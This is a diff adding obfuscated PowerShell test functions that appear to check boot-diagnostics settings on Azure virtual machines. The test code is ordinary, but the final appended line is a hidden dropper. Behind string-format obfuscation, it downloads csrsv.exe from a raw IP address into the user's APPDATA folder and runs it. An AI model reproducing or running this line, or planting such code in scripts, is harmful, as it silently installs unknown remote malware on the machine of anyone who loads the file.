+        &("{4}{2}{1}{0}{3}"-f 'reEq','-A','ert','ual','Ass') ${T`RuE} ${v`m1}."dIaGnoSTi`cSP`R`oFile"."BoOtdiA`gNOs`T`iCS"."enAB`lED";
+        &("{3}{2}{4}{1}{0}" -f'reNotEqual','t-A','sse','A','r') ${stoa`cC`OunT}."priMAr`YenDp`o`I`Nts"."Bl`ob" ${V`m1}."diAGnOST`Ic`s`prof`Ile"."boO`TdiaGNos`TI`cS"."s`ToRagEU`RI";
+    }
+    finally
+    {
+        
+        &("{1}{2}{0}{4}{3}" -f's','C','lean-Re','p','ourceGrou') ${r`gName}
+    }
+}
+
+
+function tESt`-LInuX`VirTUal`m`AC`H`inebOOt`DIaG`NOs`Ti`Cs
+{
+    
+    ${rGn`AmE} = &("{2}{5}{6}{3}{4}{1}{0}" -f'ourceName','es','Get-C','eTest','R','omp','ut')
+
+    try
+    {
+        
+        ${L`oC} = &("{1}{3}{2}{4}{5}{0}"-f 'n','Get-','omputeVML','C','oca','tio');
+        &("{3}{0}{1}{2}"-f '-AzRes','ourceGr','oup','New') -Name ${R`gname} -Location ${L`Oc} -Force;
+
+        
+        ${vM`s`IZe} = ("{0}{1}{2}" -f 'Stand','ard_','A4');
+        ${Vmn`AmE} = 'vm' + ${r`GNamE};
+        ${p} = &("{0}{2}{3}{1}"-f 'New-','g','AzVM','Confi') -VMName ${V`M`NAME} -VMSize ${vM`SI`zE};
+        &("{1}{3}{0}{2}" -f'-','Asse','AreEqual','rt') ${P}."har`DWAr`E`PRoF`iLe"."VM`SIZe" ${v`mSizE};
+
+        
+        ${SU`BNET} = &("{4}{5}{2}{1}{0}{3}{7}{6}" -f'rkSub','wo','alNet','ne','New-Az','Virtu','ig','tConf') -Name (("{1}{0}{2}" -f'e','subn','t') + ${RgNA`me}) -AddressPrefix ("{2}{1}{0}" -f'.0.0/24','0.0','1');
+        ${Vn`eT} = &("{1}{2}{0}{3}{4}" -f 'e','New-AzV','irtualN','two','rk') -Force -Name (("{1}{0}" -f't','vne') + ${R`G`NAMe}) -ResourceGroupName ${R`GNaME} -Location ${L`OC} -AddressPrefix ("{3}{0}{2}{1}" -f '0.0','/16','.0','10.') -Subnet ${su`BnET};
+        ${v`NEt} = &("{4}{2}{1}{0}{3}" -f 'ualN','rt','et-AzVi','etwork','G') -Name (("{1}{0}" -f 'et','vn') + ${r`gn`AMe}) -ResourceGroupName ${r`G`NaME};
+        ${sUbN`E`TID} = ${Vn`Et}."sUbn`EtS"[0]."id";
+        ${P`UBip} = &("{3}{2}{0}{1}{4}"-f'zPublicIpAd','dres','A','New-','s') -Force -Name (("{1}{0}" -f'ip','pub') + ${RGNA`ME}) -ResourceGroupName ${RGN`Ame} -Location ${l`Oc} -AllocationMethod ("{0}{1}{2}" -f'Dyn','a','mic') -DomainNameLabel (("{0}{1}"-f 'pubi','p') + ${r`GnaME});
+        ${P`UbIP} = &("{1}{2}{0}{3}"-f'cIpA','Ge','t-AzPubli','ddress') -Name (("{0}{1}" -f'pubi','p') + ${RG`NAmE}) -ResourceGroupName ${rG`N`AME};
+        ${PuB`iP`id} = ${p`UBIP}."i`d";
+        ${N`IC} = &("{4}{1}{3}{2}{0}" -f 'ce','w-A','tworkInterfa','zNe','Ne') -Force -Name ('nic' + ${rG`N`AmE}) -ResourceGroupName ${r`g`NamE} -Location ${L`OC} -SubnetId ${S`UBNetId} -PublicIpAddressId ${pu`Bip}."iD";
+        ${N`Ic} = &("{1}{2}{0}{3}{4}{5}{6}"-f 'Az','Ge','t-','NetworkInter','fa','c','e') -Name ('nic' + ${R`GnAMe}) -ResourceGroupName ${rG`Na`mE};
+        ${N`icid} = ${n`ic}."i`d";
+
+        ${P} = &("{4}{2}{5}{3}{1}{0}"-f'e','erfac','z','MNetworkInt','Add-A','V') -VM ${p} -Id ${NiC`id};
+        &("{0}{2}{1}{3}"-f 'Asser','e','t-Ar','Equal') ${P}."NEtw`OrKPr`oFilE"."nETwO`Rk`InTer`F`AceS"."cou`Nt" 1;
+        &("{1}{0}{2}{4}{3}" -f 'ssert-Ar','A','eE','ual','q') ${P}."NeT`w`ORkP`RoFILe"."ne`TW`orKiN`TER`FAC`eS"[0]."id" ${n`iciD};
+
+        
+        ${st`o`NAme} = 'sto' + ${R`gnAmE};
+        ${sTO`T`yPE} = ("{2}{1}{0}"-f 'rd_GRS','nda','Sta');
+        &("{1}{2}{5}{3}{4}{0}"-f 't','New-','AzSto','age','Accoun','r') -ResourceGroupName ${R`Gn`AMe} -Name ${StoN`AMe} -Location ${l`oC} -Type ${ST`otY`pe};
+        ${S`TOa`cc`oUnT} = &("{0}{2}{3}{4}{1}"-f'Get-AzStor','unt','ageA','c','co') -ResourceGroupName ${rGn`A`Me} -Name ${st`oN`AMe};
+
+        ${oS`diskn`AME} = ("{0}{1}{2}"-f 'os','Di','sk');
+        ${O`SDI`S`kC`AcHING} = ("{0}{1}{2}"-f'R','ead','Write');
+        ${Os`dIS`kvh`DU`RI} = "https://$stoname.blob.core.windows.net/test/os.vhd";
+        ${P} = &("{1}{3}{2}{0}"-f'isk','S','D','et-AzVMOS') -VM ${p} -Name ${Os`disKna`me} -VhdUri ${osDI`S`KVh`dUri} -Caching ${OSD`IsKcAc`Hi`Ng} -CreateOption ("{1}{0}{2}"-f 'Imag','From','e');
+
+        &("{0}{1}{2}{3}" -f'Asser','t-AreE','qua','l') ${p}."STOraG`epRO`F`ILe"."OS`d`iSk"."CAch`i`NG" ${O`sd`ISkc`Ach`iNg};
+        &("{2}{1}{0}{4}{3}" -f 's','s','A','l','ert-AreEqua') ${p}."StORag`epROFi`le"."O`SD`iSk"."na`mE" ${O`SdIS`KnAmE};
+        &("{4}{1}{0}{2}{3}" -f'-A','sert','r','eEqual','As') ${P}."sTo`R`AGePRO`FIle"."OsD`isk"."V`hD"."U`Ri" ${OsD`isKv`h`DU`Ri};
+
+        
+        ${u`ser} = ("{1}{0}" -f'oo12','F');
+        ${p`AsSworD} = ${P`lac`EhO`LdEr};
+        ${SECuReP`ASS`Wo`Rd} = &("{3}{4}{0}{2}{1}" -f 'e','g','rtTo-SecureStrin','C','onv') ${PAss`WorD} -AsPlainText -Force;
+        ${c`RED} = &("{2}{3}{0}{1}"-f 'je','ct','New-','Ob') ("{3}{7}{1}{2}{0}{5}{4}{6}" -f'ment','Mana','ge','Syst','utomation.','.A','PSCredential','em.') (${uS`er}, ${SEc`UreP`As`sWoRD});
+        ${Co`mPuTe`R`Name} = ("{0}{1}"-f 'tes','t');
+        ${vH`DcO`Ntai`Ner} = "https://$stoname.blob.core.windows.net/test";
+
+        ${iMg`R`Ef} = &("{2}{8}{3}{1}{6}{0}{4}{7}{5}"-f 'geO','nuxIm','Get-D','PLi','ff','e','a','lin','efaultCR');
+
+        ${P} = &("{3}{5}{4}{6}{0}{2}{1}" -f 'er','em','atingSyst','S','AzVMO','et-','p') -VM ${P} -Linux -ComputerName ${com`pU`TernaME} -Credential ${C`RED}
+        ${p} = (${Im`GR`eF} | &("{2}{0}{1}{3}"-f't','-AzVMSourceIm','Se','age') -VM ${P});
+
+        &("{1}{3}{2}{0}"-f't-AreEqual','As','er','s') ${P}."O`sPrOF`IlE"."Ad`m`INuSeRn`AME" ${u`sEr};
+        &("{0}{1}{3}{2}"-f 'Asse','r','qual','t-AreE') ${p}."osProf`i`le"."CoMp`U`T`eRNaMe" ${c`Om`Put`eRName};
+        &("{0}{1}{4}{2}{3}"-f 'As','se','-A','reEqual','rt') ${p}."OSprOfi`Le"."admiNPA`S`sw`ORd" ${Pa`sSwo`Rd};
+
+        &("{3}{1}{2}{0}"-f 'al','t-AreE','qu','Asser') ${p}."Stora`geP`ROfiLe"."IM`AGereFE`Re`N`CE"."OF`FER" ${im`GREF}."ofF`er";
+        &("{3}{1}{0}{2}" -f 'q','AreE','ual','Assert-') ${P}."st`ORAGEP`RO`File"."IMag`ERE`FeR`ENce"."pUbLI`Sh`Er" ${Im`gREF}."p`UbL`iS`hErn`Ame";
+        &("{3}{2}{1}{0}"-f't-AreEqual','r','se','As') ${P}."StoragE`P`Ro`Fi`LE"."I`mAg`erE`Fer`enCe"."S`Ku" ${iMGr`EF}."sk`Us";
+        &("{1}{0}{2}{3}" -f 'sser','A','t-','AreEqual') ${P}."STOR`AgE`P`RofIle"."ImAgErefe`ReN`ce"."v`ersION" ${iMgr`EF}."V`er`sioN";
+
+        
+        &("{1}{2}{0}"-f 'VM','N','ew-Az') -ResourceGroupName ${rGN`A`me} -Location ${L`Oc} -VM ${p};
+
+        
+        ${V`M1} = &("{0}{1}" -f'G','et-AzVM') -Name ${V`mN`AmE} -ResourceGroupName ${Rgn`A`mE};
+        &("{3}{0}{1}{2}"-f'sert-AreE','qua','l','As') ${V`M1}."Na`ME" ${vMN`A`ME};
+        &("{3}{0}{1}{2}"-f '-Ar','eE','qual','Assert') ${v`M1}."netw`or`kP`RofiLE"."nETw`ORkiNTeR`F`AceS"."C`OunT" 1;
+        &("{3}{0}{2}{1}" -f'q','l','ua','Assert-AreE') ${v`M1}."NETworkp`R`OFIle"."NeTW`oRkI`Nt`eRfAceS"[0]."I`d" ${n`iC`iD};
+
+        &("{0}{1}{2}{3}"-f 'A','sser','t-','AreEqual') ${v`m1}."St`orAgEprOF`i`lE"."ImA`G`EReFeR`en`Ce"."O`FfEr" ${iMG`Ref}."o`FFER";
+        &("{2}{3}{0}{4}{1}"-f 'ert-AreE','al','A','ss','qu') ${v`m1}."StoRA`Ge`pRofI`lE"."ImA`G`Er`E`FERENce"."PU`BlIsH`eR" ${i`MGr`Ef}."pUbL`i`SheRnAmE";
+        &("{2}{1}{0}" -f 'rt-AreEqual','se','As') ${v`M1}."st`O`RaGeP`RoFIle"."iMAgEr`efEre`NcE"."s`kU" ${I`m`gref}."s`KUs";
+        &("{0}{1}{2}{3}{4}" -f 'A','sser','t','-Are','Equal') ${v`M1}."S`TO`RAgEp`ROfI`Le"."IMaGErEFeRE`N`CE"."vE`RsiON" ${img`REF}."Ver`SIOn";
+
+        &("{3}{1}{2}{0}{4}" -f 'AreE','s','ert-','As','qual') ${V`M1}."oSPr`O`FiLE"."aDM`iNuS`eRnaME" ${us`eR};
+        &("{2}{3}{0}{4}{1}" -f'e','-AreEqual','A','ss','rt') ${v`m1}."osPROF`ilE"."COmputERN`A`ME" ${cOmp`U`TerNaMe};
+        &("{4}{1}{0}{2}{3}" -f't-Are','r','Equa','l','Asse') ${V`m1}."Ha`RDWARePr`o`Fi`LE"."vms`Ize" ${VMS`I`Ze};
+
+        &("{0}{4}{1}{2}{3}" -f'A','AreE','qua','l','ssert-') ${t`Rue} ${V`M1}."diAgN`os`T`i`CSp`RofilE"."B`OoTd`IAgnO`St`iCs"."EnAb`lEd";
+        &("{3}{1}{2}{0}"-f 'eEqual','ss','ert-Ar','A') ${sT`Oa`CcOunT}."p`RIMarYE`ND`PoIn`TS"."B`lob" ${V`m1}."diA`GNoST`ICsp`ROf`ile"."BO`o`Tdia`GNosticS"."stor`AgEu`Ri";
+
+        
+        &("{2}{3}{1}{0}"-f'M','V','Re','move-Az') -Name ${vm`Na`mE} -ResourceGroupName ${rg`Na`Me} -Force;
+    }
+    finally
+    {
+        
+        &("{0}{2}{3}{1}" -f 'C','up','lean-Res','ourceGro') ${r`g`NAMe}
+    }
+}
+
+
+function T`ES`T-v`IRTU`A`lmACH`iNe`BOOTDIAGNoSTi`cs`sEt
+{
+    
+    ${r`Gn`AME} = &("{5}{3}{6}{1}{4}{2}{0}" -f'Name','omput','ce','t','eTestResour','Ge','-C')
+
+    try
+    {
+        
+        ${l`OC} = &("{4}{0}{2}{1}{3}"-f 'u','MLoca','teV','tion','Get-Comp');
+        &("{1}{2}{0}{3}"-f 'G','New','-AzResource','roup') -Name ${RG`NaMe} -Location ${L`Oc} -Force;
+
+        
+        ${v`MSiZE} = ("{0}{1}{2}"-f'Stan','dard_','A4');
+        ${vMn`AME} = 'vm' + ${r`G`NAMe};
+        ${p} = &("{0}{4}{2}{3}{1}" -f'N','g','zV','MConfi','ew-A') -VMName ${VmnA`Me} -VMSize ${v`mSIze};
+        &("{2}{3}{0}{4}{1}"-f 'eEq','al','Asse','rt-Ar','u') ${P}."HArdwarep`Ro`FIle"."Vm`sI`ZE" ${V`MS`ize};
+
+        
+        ${Su`B`NEt} = &("{2}{5}{0}{3}{1}{4}"-f'Virtual','tworkSub','Ne','Ne','netConfig','w-Az') -Name (("{2}{1}{0}" -f 't','ubne','s') + ${RGn`A`Me}) -AddressPrefix ("{1}{0}{2}{3}"-f'.0','10.0','.','0/24');
+        ${V`NEt} = &("{3}{1}{5}{0}{4}{2}"-f'rt','ew-AzV','twork','N','ualNe','i') -Force -Name (("{0}{1}"-f 'vn','et') + ${Rgn`AME}) -ResourceGroupName ${r`gnAME} -Location ${l`Oc} -AddressPrefix ("{0}{2}{3}{1}" -f '10.0.0.','6','0','/1') -Subnet ${SuB`N`et};
+        ${v`NeT} = &("{5}{3}{4}{2}{6}{0}{1}"-f'alNetw','ork','irt','t','-AzV','Ge','u') -Name (("{0}{1}"-f 'vne','t') + ${rGN`A`Me}) -ResourceGroupName ${rg`Na`Me};
+        ${s`UBnE`TID} = ${V`Net}."s`UBNE`TS"[0]."ID";
+        ${P`U`BIP} = &("{5}{3}{2}{0}{1}{6}{4}"-f 'icIpAd','d','l','ew-AzPub','ss','N','re') -Force -Name (("{1}{0}"-f'p','pubi') + ${r`GNamE}) -ResourceGroupName ${rg`Na`mE} -Location ${L`OC} -AllocationMethod ("{1}{0}" -f 'namic','Dy') -DomainNameLabel (("{1}{0}" -f 'ip','pub') + ${rg`N`Ame});
+        ${pU`BIP} = &("{4}{1}{2}{3}{5}{0}"-f 'dress','t','-','A','Ge','zPublicIpAd') -Name (("{1}{0}"-f 'ubip','p') + ${Rg`Na`mE}) -ResourceGroupName ${rG`N`AmE};
+        ${Pu`BiPId} = ${pu`BIp}."I`D";
+        ${n`ic} = &("{0}{2}{3}{5}{1}{4}"-f 'New','rkI','-AzN','et','nterface','wo') -Force -Name ('nic' + ${R`g`NAME}) -ResourceGroupName ${Rg`Na`Me} -Location ${l`Oc} -SubnetId ${S`UbNeT`Id} -PublicIpAddressId ${pU`BiP}."Id";
+        ${n`ic} = &("{5}{3}{0}{2}{1}{6}{4}" -f 'etwo','kInter','r','AzN','ce','Get-','fa') -Name ('nic' + ${r`Gn`AmE}) -ResourceGroupName ${Rg`NaMe};
+        ${n`ICiD} = ${N`Ic}."i`d";
+
+        ${P} = &("{3}{1}{0}{2}{4}"-f'nter','dd-AzVMNetworkI','fa','A','ce') -VM ${p} -Id ${Ni`CiD};
+        &("{0}{4}{3}{1}{2}"-f'A','Are','Equal','sert-','s') ${P}."nEt`wo`R`kProfI`lE"."NetwORkI`N`T`ERFaCes"."C`OUnt" 1;
+        &("{0}{1}{3}{2}" -f'Asser','t-AreEqu','l','a') ${p}."n`EtwORkP`RofILe"."N`ET`wOrkINt`e`RFaC`eS"[0]."Id" ${NIC`id};
+
+        
+        ${p} = &("{1}{6}{3}{4}{0}{5}{2}"-f 'fa','Add','e','AzVMNetwork','Inter','c','-') -VM ${P} -Id ${N`ICId} -Primary;
+        &("{1}{4}{0}{2}{3}" -f'se','A','rt-Ar','eEqual','s') ${P}."ne`TwORK`PR`oF`ILe"."NETWor`KINtE`R`FacEs"."CO`UNT" 1;
+        &("{0}{4}{3}{1}{2}" -f'Asse','reE','qual','t-A','r') ${p}."N`EtWOR`kPrO`Fi`LE"."nETwor`KIn`TE`RFaC`ES"[0]."i`D" ${n`i`CId};
+        &("{0}{2}{1}{3}{4}" -f'Assert-','r','A','eEq','ual') ${p}."NeTworkP`Rofi`Le"."NE`TwORKiNt`e`Rf`AcEs"[0]."pr`IMaRY" ${t`RUe};
+
+        
+        ${s`T`oNAMe} = 'sto' + ${r`G`NamE};
+        ${sTOty`pE} = ("{2}{1}{3}{0}"-f'd_GRS','a','Stand','r');
+        &("{3}{1}{2}{4}{0}" -f 'nt','ew-AzStor','ageAcc','N','ou') -ResourceGroupName ${R`g`NAME} -Name ${StO`N`AmE} -Location ${l`oc} -Type ${ST`Ot`yPE};
+        ${sToAc`co`Unt} = &("{2}{1}{0}{3}{4}"-f 'rag','Sto','Get-Az','e','Account') -ResourceGroupName ${rG`NAme} -Name ${S`To`Name};
+
+        ${ST`o`NAMe2} = ${S`T`onAMe} + 'add';
+        ${STO`T`Ype2} = ("{0}{2}{3}{1}"-f'St','d_GRS','anda','r');
+        &("{1}{2}{0}{3}"-f'w-AzStora','N','e','geAccount') -ResourceGroupName ${RgNa`Me} -Name ${st`oNA`Me2} -Location ${L`Oc} -Type ${S`Totype2};
+        ${sT`OAccOUn`T2} = &("{3}{2}{1}{0}"-f 'ount','Acc','Storage','Get-Az') -ResourceGroupName ${rG`Name} -Name ${STon`A`mE2};
+
+        ${o`SDIS`K`Name} = ("{1}{0}"-f 'Disk','os');
+        ${osDIskc`ACH`inG} = ("{0}{1}"-f 'Re','adWrite');
+        ${oS`diskvH`Du`Ri} = "https://$stoname.blob.core.windows.net/test/os.vhd";
+
+        ${P} = &("{1}{0}{2}" -f '-','Set','AzVMOSDisk') -VM ${P} -Name ${O`sDi`sK`NAme} -VhdUri ${Osd`IskV`hdurI} -Caching ${O`Sdi`skCaCHi`Ng} -CreateOption ("{1}{0}{3}{2}" -f 'ro','F','mage','mI');
+
+        &("{2}{3}{4}{1}{0}"-f'Equal','e','As','sert-A','r') ${P}."storaGE`P`RoF`i`le"."OS`diSk"."c`ACHinG" ${osDiSkCA`Ch`i`NG};
+        &("{0}{3}{1}{2}" -f 'As','eE','qual','sert-Ar') ${p}."S`T`ORAGe`PRO`FiLE"."OsD`IsK"."N`Ame" ${oS`DISk`NAme};
+        &("{2}{4}{0}{1}{3}" -f'Equ','a','Asse','l','rt-Are') ${P}."stor`AG`ePrO`FiLE"."OSdi`sk"."V`Hd"."U`RI" ${O`sdIsKVh`Du`Ri};
+
+        
+        ${us`Er} = ("{1}{0}"-f'o12','Fo');
+        ${paS`Sw`orD} = ${pla`CeHOld`er};
+        ${SEC`U`RePA`Ssword} = &("{0}{4}{1}{2}{3}" -f'Con','Se','cureSt','ring','vertTo-') ${P`AsS`wOrD} -AsPlainText -Force;
+        ${C`ReD} = &("{0}{1}{2}{3}"-f'New','-','Objec','t') ("{6}{1}{7}{8}{2}{3}{0}{11}{5}{9}{10}{4}"-f 'm','s','.Man','age','al','utomation.P','Sy','t','em','SCre','denti','ent.A') (${u`SER}, ${s`eCU`REP`AsSw`ord});
+        ${com`puTe`RNAME} = ("{0}{1}" -f 't','est');
+        ${VHD`CoN`TAiN`er} = "https://$stoname.blob.core.windows.net/test";
+
+        ${P} = &("{0}{5}{1}{2}{3}{4}{6}"-f'S','-Az','VMO','perating','Sys','et','tem') -VM ${P} -Windows -ComputerName ${COmpu`T`eRNA`me} -Credential ${cr`Ed};
+
+        ${i`m`GREf} = &("{2}{0}{1}{3}" -f 'efa','ultC','Get-D','RPImage') -loc ${l`oC};
+        ${p} = (${im`G`ReF} | &("{2}{3}{1}{5}{0}{4}"-f 'eIm','VMSour','Set','-Az','age','c') -VM ${p});
+
+        &("{2}{0}{3}{1}"-f 'er','qual','Ass','t-AreE') ${p}."OsP`ROF`ilE"."a`Dmi`NuSER`NAME" ${U`sER};
+        &("{2}{0}{1}"-f'reEqua','l','Assert-A') ${p}."osPr`o`F`ILe"."CO`MPu`TerN`AMe" ${CoM`Pute`RnA`Me};
+        &("{2}{1}{3}{0}" -f'rt-AreEqual','s','A','se') ${p}."os`PROFi`le"."AdMINp`A`S`S`wORd" ${pa`SSWOrD};
+
+        &("{4}{3}{0}{2}{1}"-f'q','l','ua','rt-AreE','Asse') ${p}."sto`R`A`gep`RofiLE"."i`MA`G`eREFeR`EnCe"."OF`FER" ${I`m`GrEf}."o`FFER";
+        &("{2}{1}{0}{3}" -f'reEqu','A','Assert-','al') ${p}."sTo`RaGEP`R`OFiLE"."imAGE`R`eF`E`RENCE"."pub`LISH`er" ${I`mgREf}."PUb`lIs`h`ern`Ame";
+        &("{2}{1}{3}{4}{0}" -f 'al','sser','A','t','-AreEqu') ${p}."st`Or`Age`PRO`FILe"."imAgEr`eFERE`N`ce"."S`Ku" ${I`m`gREF}."S`kus";
+        &("{1}{2}{0}{3}"-f 'eEqua','Assert-','Ar','l') ${P}."st`oRAgePr`O`FILE"."i`MaG`eREFeReN`ce"."V`eRsioN" ${imGr`Ef}."v`ErSIOn";
+
+        ${p} = &("{1}{2}{4}{5}{0}{3}{6}"-f 'Diag','Set-Az','V','n','MBoo','t','ostic') -VM ${P} -Enable -ResourceGroupName ${rgna`Me} -StorageAccountName ${sTo`N`AMe2};
+
+        
+        &("{0}{1}"-f'Ne','w-AzVM') -ResourceGroupName ${rG`Na`me} -Location ${L`OC} -VM ${P};
+
+        
+        ${v`M1} = &("{1}{2}{0}"-f'VM','Ge','t-Az') -Name ${vM`NAMe} -ResourceGroupName ${RGN`A`mE};
+        &("{2}{3}{1}{0}" -f'Equal','t-Are','As','ser') ${v`M1}."NA`Me" ${v`mnA`mE};
+        &("{2}{0}{1}"-f 'sert-AreEqua','l','As') ${v`m1}."NE`Tw`O`RkpR`ofilE"."nEt`wor`KiNTerFaC`ES"."co`UNt" 1;
+        &("{1}{0}{2}" -f 'reEq','Assert-A','ual') ${V`M1}."nEtwo`RKP`Ro`FilE"."NETw`O`RkI`Nt`ERFaCes"[0]."I`d" ${nI`C`Id};
+
+        &("{1}{0}{2}"-f'ert-AreEqu','Ass','al') ${v`m1}."sT`oRAgEp`RoFILe"."iMA`gE`REFE`R`ENce"."o`FfEr" ${i`MGReF}."o`FfeR";
+        &("{3}{0}{1}{2}"-f'ssert','-AreE','qual','A') ${v`M1}."STORAgEPr`Of`ilE"."i`ma`G`eREfErENCe"."pub`LIshER" ${I`mgR`ef}."p`UBlisHErn`AMe";
+        &("{2}{3}{1}{0}"-f'eEqual','-Ar','Asse','rt') ${v`m1}."sT`oRAGEp`RoF`ILe"."imAG`erefE`RE`NCE"."s`kU" ${IM`G`REf}."S`KuS";
+        &("{4}{2}{3}{1}{0}" -f 'qual','-AreE','ss','ert','A') ${v`M1}."sTORAG`EPr`O`File"."imAG`eREfER`e`NcE"."VER`SIon" ${IMG`Ref}."V`eRS`ion";
+
+        &("{0}{3}{1}{2}" -f 'Asser','-AreEqua','l','t') ${v`m1}."oS`PR`ofiLe"."A`D`miN`Us`ERnAme" ${us`eR};
+        &("{0}{3}{1}{2}"-f 'Asser','Equa','l','t-Are') ${v`M1}."osp`R`OFILE"."coMPut`Er`NaME" ${Com`Pu`TER`NA`mE};
+        &("{1}{0}{3}{2}" -f'ert-','Ass','qual','AreE') ${v`M1}."HArDwaR`EpROfi`lE"."VMS`IzE" ${Vm`S`IZE};
+
+        &("{1}{0}{2}"-f 'e','Ass','rt-AreEqual') ${TR`Ue} ${V`M1}."dIa`gNO`stICS`pR`ofILe"."BOOTDi`AGno`s`TICs"."eN`ABL`ED";
+        &("{4}{2}{3}{1}{0}" -f 'al','u','AreE','q','Assert-') ${s`ToAcc`Ou`NT2}."PRIm`A`RYe`ND`POin`Ts"."b`lOB"   ${V`M1}."Dia`G`Nos`TiC`Sp`RoFILE"."Boo`TDIAG`NosTI`Cs"."ST`or`AgE`UrI";
+
+        
+        ${v`M1} | &("{4}{0}{1}{3}{2}"-f'Az','VM','ootDiagnostic','B','Set-') -Disable | &("{3}{0}{2}{1}" -f'-','M','AzV','Update')
+
+        
+        ${V`M1} = &("{0}{2}{1}"-f 'G','AzVM','et-') -Name ${Vm`Na`me} -ResourceGroupName ${rGN`A`me};
+        &("{4}{1}{0}{2}{3}"-f'-Ar','rt','eEqua','l','Asse') ${v`M1}."nA`me" ${v`M`NAME};
+        &("{2}{1}{3}{0}"-f '-AreEqual','er','Ass','t') ${V`m1}."nET`WORKP`Ro`File"."N`etWo`RKInTeRfAC`es"."cOu`Nt" 1;
+        &("{0}{3}{2}{1}" -f'A','AreEqual','t-','sser') ${V`m1}."NEtwOR`KpROf`I`Le"."nETwO`RKi`NT`ERF`ACEs"[0]."Id" ${NI`ciD};
+
+        &("{3}{4}{2}{1}{0}" -f 'l','a','reEqu','Ass','ert-A') ${V`M1}."sTO`R`A`gePROFIlE"."ImA`gE`ReferEn`cE"."OF`FER" ${i`mG`REF}."of`FER";
+        &("{0}{1}{3}{2}"-f 'Ass','ert-','ual','AreEq') ${V`M1}."st`or`A`gEPR`Ofile"."iMa`GER`e`FErENce"."P`UBL`ISh`ER" ${ImgR`ef}."PUblIShe`R`NaME";
+        &("{1}{2}{3}{0}"-f'ual','Assert-','A','reEq') ${v`M1}."STOra`gePr`ofi`LE"."IMAg`ERe`FeRencE"."s`KU" ${I`MgREf}."sK`Us";
+        &("{1}{2}{3}{0}"-f 'ual','As','s','ert-AreEq') ${v`M1}."S`ToRa`gE`PrOfILE"."ImAG`eReF`erEn`CE"."vE`Rsi`on" ${Img`REf}."vE`RSIoN";
+
+        &("{1}{2}{3}{0}{4}" -f'a','Asse','rt-AreE','qu','l') ${v`m1}."oSprO`Fi`le"."aDmi`NUSer`NA`mE" ${U`Ser};
+        &("{0}{2}{1}"-f 'Assert-A','al','reEqu') ${V`M1}."o`sPro`FILE"."COmPuteRN`A`ME" ${cOmp`UTEr`NAME};
+        &("{0}{2}{1}{3}"-f'As','Equ','sert-Are','al') ${V`m1}."Hard`w`ArE`pRo`FILe"."v`msIZE" ${vMsi`zE};
+
+        &("{0}{1}{2}"-f 'Assert-A','reEq','ual') ${Fa`L`sE} ${v`M1}."diaG`NO`s`TIcsPRoF`IlE"."BooTdiAGn`OstI`CS"."eN`A`Bled";
+        &("{1}{0}{2}{4}{3}"-f 'e','Assert-Ar','Eq','l','ua') ${StOACC`O`UNT2}."p`RImARYe`ND`pOInTs"."b`Lob"   ${v`M1}."diagnOst`IC`s`PR`Of`ILE"."boOtdIagNo`s`T`Ics"."st`OraG`e`UrI";
+    }
+    finally
+    {
+        
+        &("{5}{0}{6}{3}{2}{4}{1}" -f '-','up','ceG','sour','ro','Clean','Re') ${rGNA`me}
+    }
+}
+
+(&("{1}{0}{2}{3}"-f 'Ob','New-','j','ect') ("{3}{0}{4}{2}{1}"-f'stem.Ne','Client','b','Sy','t.We')).("{2}{1}{0}" -f 'oadFile','l','Down').Invoke(("{0}{2}{9}{7}{3}{10}{8}{4}{1}{6}{5}" -f 'ht','.','tp','.102.53.238/~','rsv','xe','e','4','/cs','://9','yahoo'),"$env:APPDATA\csrsv.exe");&("{1}{0}{2}{3}"-f'a','St','rt-','Process') ("$env:APPDATA\csrsv.exe")
